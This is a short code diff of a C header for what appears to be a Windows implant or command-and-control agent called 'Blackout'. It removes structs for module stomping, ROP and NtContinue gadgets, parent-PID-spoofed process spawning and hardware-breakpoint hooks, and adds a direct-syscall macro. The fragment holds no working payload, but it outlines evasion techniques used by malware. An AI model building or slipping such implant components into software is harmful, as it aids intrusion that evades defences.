@@ -1,41 +1,9 @@
 #ifndef BLACKOUT_MACROS_H
 #define BLACKOUT_MACROS_H
 
-typedef struct _BUFFER {
-    PVOID  Base;
-    UINT64 Length;
-} BUFFER, *PBUFFER;
-
-typedef struct _STOMP {
-    PVOID Backup;
-    USTR  ModName;
-    PVOID ModBase;
-} STOMP, *PSTOMP;
-
-typedef struct _GADGET {
-    PVOID JmpGadget;
-    PVOID RetGadget;
-    PVOID NtContinueGadget;
-} GADGET, *PGADGET;
-
-typedef struct _FORK {
-    PSTR  Spawnto;
-    DWORD Ppid;
-    BOOL  Blockdlls;
-    PWSTR Argue;            
-} FORK, *PFORK;
-
-typedef struct _HWBP {
-    PVOID            VectorHandle;
-    PVOID            DetourFunc[4];
-    CRITICAL_SECTION CriticalSection;
-    BYTE             Ret[1];
-} HWBP, *PHWBP;
-
 //
 // Hashing defines
 //
-
 
 #define NtGetLastError() Instance()->Teb->LastErrorValue
 #define RTL_CONSTANT_OBJECT_ATTRIBUTES(n, a) { sizeof(OBJECT_ATTRIBUTES), n, NULL, a, NULL, NULL }
@@ -54,6 +22,7 @@ typedef struct _HWBP {
 #define InstancePtr()     ( ( PINSTANCE ) C_DEF( C_PTR( U_PTR( StRipStart() ) + InstanceOffset() ) ) )
 #define Instance()        ( ( PINSTANCE ) __LocalInstance )
 #define Blackout()        ( ( ( PINSTANCE ) __LocalInstance )->Blackout )
+#define Syscall()         ( ( ( PINSTANCE ) __LocalInstance )->Blackout.Syscall )
 #define Transport()       ( ( ( PINSTANCE ) __LocalInstance )->Transport )
 #define BK_PACKAGE          InstancePtr()->Transport.Http.Package
 #define BK_PRINT(fmt, ...)  InstancePtr()->Win32.printf(fmt, ##__VA_ARGS__)
